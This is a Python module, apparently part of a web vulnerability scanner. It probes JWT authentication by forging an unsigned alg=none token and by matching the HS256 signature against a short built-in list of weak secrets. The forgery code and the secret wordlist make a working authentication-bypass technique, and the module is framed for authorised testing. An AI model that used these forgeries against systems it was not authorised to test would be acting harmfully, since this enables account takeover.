"""JWT confusion + weak-secret probes.

Two families, both deterministic:

* **alg=none** — Some libraries accept an unsigned token when the header
  claims ``alg: none``. Craft such a token from a valid JWT and see if a
  protected endpoint accepts it.
* **HS256 weak-secret HMAC** — Try a bounded dictionary of common weak
  HMAC secrets against the original signature. If one matches, the token
  can be forged.

No brute force beyond the built-in short list. The pack refuses to run
if the caller does not supply the original valid JWT.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass, field
from typing import Any

TECHNIQUE_ID = "web_jwt_confusion"
CWE = "CWE-347"

_WEAK_SECRETS = [
    "secret",
    "password",
    "12345",
    "changeme",
    "admin",
    "jwt",
    "test",
    "development",
    "your-256-bit-secret",
    "supersecret",
    "s3cr3t",
    "secretkey",
]


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _split(token: str) -> tuple[str, str, str] | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]


@dataclass
class JWTExchange:
    label: str
    detail: str
    url: str = ""
    status_code: int = 0

    def to_dict(self) -> dict[str, Any]:
        return self.__dict__


@dataclass
class JWTResult:
    finding_status: str  # CONFIRMED | INCONCLUSIVE | REJECTED
    reason: str
    strategy: str = ""  # alg-none | weak-secret
    exchanges: list[JWTExchange] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "finding_status": self.finding_status,
            "reason": self.reason,
            "strategy": self.strategy,
            "exchanges": [e.to_dict() for e in self.exchanges],
        }


def _forge_alg_none(original: str) -> str | None:
    parts = _split(original)
    if not parts:
        return None
    _, payload, _ = parts
    header = {"alg": "none", "typ": "JWT"}
    header_seg = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    # alg=none forgery: no signature segment.
    return f"{header_seg}.{payload}."


def _try_weak_secret(original: str) -> str | None:
    parts = _split(original)
    if not parts:
        return None
    header_seg, payload_seg, sig_seg = parts
    try:
        header = json.loads(_b64url_decode(header_seg))
    except Exception:
        return None
    if header.get("alg", "").upper() != "HS256":
        return None
    signing_input = f"{header_seg}.{payload_seg}".encode()
    try:
        original_sig = _b64url_decode(sig_seg)
    except Exception:
        return None
    for secret in _WEAK_SECRETS:
        candidate = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(candidate, original_sig):
            return secret
    return None


async def probe(
    *,
    client,
    protected_url: str,
    original_token: str,
) -> JWTResult:
    if not original_token or "." not in original_token:
        return JWTResult(
            finding_status="INCONCLUSIVE",
            reason="no valid JWT provided",
        )

    exchanges: list[JWTExchange] = []

    # -- Baseline: token accepted --------------------------------------------
    try:
        r = await client.get(
            protected_url,
            headers={"Authorization": f"Bearer {original_token}"},
        )
        baseline_ok = r.status_code == 200
        exchanges.append(
            JWTExchange(
                label="baseline_valid_token",
                detail=f"got {r.status_code}",
                url=protected_url,
                status_code=r.status_code,
            )
        )
    except Exception as exc:
        return JWTResult(
            finding_status="INCONCLUSIVE",
            reason=f"baseline request failed: {exc!r}",
            exchanges=exchanges,
        )
    if not baseline_ok:
        return JWTResult(
            finding_status="INCONCLUSIVE",
            reason=f"baseline token not accepted at {protected_url} ({r.status_code})",
            exchanges=exchanges,
        )

    # -- Strategy 1: alg=none forgery ----------------------------------------
    forged = _forge_alg_none(original_token)
    if forged:
        try:
            r = await client.get(
                protected_url,
                headers={"Authorization": f"Bearer {forged}"},
            )
            status = r.status_code
        except Exception as exc:
            status = 0
        exchanges.append(
            JWTExchange(
                label="alg_none_forgery",
                detail=f"got {status}",
                url=protected_url,
                status_code=status,
            )
        )
        if status == 200:
            return JWTResult(
                finding_status="CONFIRMED",
                reason=(
                    "server accepts an unsigned token with header alg='none' — "
                    "attacker can forge any claim without knowing the signing key"
                ),
                strategy="alg-none",
                exchanges=exchanges,
            )

    # -- Strategy 2: weak HMAC secret ----------------------------------------
    secret = _try_weak_secret(original_token)
    if secret:
        exchanges.append(
            JWTExchange(
                label="weak_secret_match",
                detail=f"HMAC secret matches candidate {secret!r} from bounded dictionary",
            )
        )
        return JWTResult(
            finding_status="CONFIRMED",
            reason=(
                f"HS256 signing secret is {secret!r} — a common weak value; "
                "tokens can be forged with arbitrary claims"
            ),
            strategy="weak-secret",
            exchanges=exchanges,
        )

    return JWTResult(
        finding_status="REJECTED",
        reason="alg=none rejected and no weak-secret match from bounded dictionary",
        exchanges=exchanges,
    )
